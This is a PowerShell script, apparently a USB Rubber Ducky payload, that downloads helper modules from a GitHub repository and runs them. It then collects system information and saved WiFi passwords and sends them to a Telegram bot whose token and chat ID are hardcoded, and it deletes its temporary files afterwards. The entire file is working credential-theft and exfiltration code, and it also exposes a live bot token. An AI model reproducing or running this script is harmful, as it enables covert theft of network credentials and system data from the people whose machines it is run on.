<#
.SYNOPSIS
    Rubber Duck Data Collection Script
.DESCRIPTION
    Collects WiFi passwords and basic system info, then sends to Telegram bot.
.NOTES
    GitHub: https://github.com/OGRYZOK-dev/RubberDuck
#>

# Configuration
$TOKEN = "6942623726:AAH6yXcm9EgAhbUVxCmphZF3o6H8XScPOFw"
$CHAT_ID = "6525689863"
$REPO_URL = "https://raw.githubusercontent.com/OGRYZOK-dev/RubberDuck/main/"

# Temporary directory
$tempDir = "$env:TEMP\RubberDuck"
try {
    if (-not (Test-Path $tempDir)) { New-Item -ItemType Directory -Path $tempDir -Force | Out-Null }
}
catch {
    exit 1
}

# Improved module download with error handling
function Download-Module {
    param ($moduleName)
    $url = "$REPO_URL/modules/$moduleName"
    $output = "$tempDir\$moduleName"
    
    try {
        Write-Output "Downloading module: $moduleName"
        (New-Object System.Net.WebClient).DownloadFile($url, $output)
        return $true
    }
    catch {
        Write-Output "Failed to download module: $moduleName"
        return $false
    }
}

# Import modules with better error handling
$modules = @("wifi.ps1", "system.ps1", "telegram.ps1")
foreach ($module in $modules) {
    if (Download-Module $module) {
        try {
            . "$tempDir\$module"
            Write-Output "Successfully loaded module: $module"
        }
        catch {
            Write-Output "Failed to load module: $module"
            continue
        }
    }
}

# Main collection function with try-catch
function Collect-AllData {
    $output = @()
    
    try {
        $output += "=== System Information ==="
        $output += Get-SystemInfo
    }
    catch {
        $output += "Error getting system info: $_"
    }
    
    try {
        $output += "`n=== WiFi Passwords ==="
        $output += Get-WifiPasswords
    }
    catch {
        $output += "Error getting WiFi passwords: $_"
    }
    
    return ($output -join "`n")
}

# Execute with comprehensive error handling
try {
    $collectedData = Collect-AllData
    
    # Truncate if too long for Telegram (max 4096 chars)
    if ($collectedData.Length -gt 4000) {
        $collectedData = $collectedData.Substring(0, 4000) + "...[TRUNCATED]"
    }
    
    Send-TelegramMessage -Token $TOKEN -ChatID $CHAT_ID -Message $collectedData
}
catch {
    $errorMsg = "Main execution error: $_"
    try {
        Send-TelegramMessage -Token $TOKEN -ChatID $CHAT_ID -Message $errorMsg
    }
    catch {
        # Final fallback if even Telegram fails
        Write-Output $errorMsg
    }
}
finally {
    # Cleanup with error suppression
    Remove-Item -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue
}
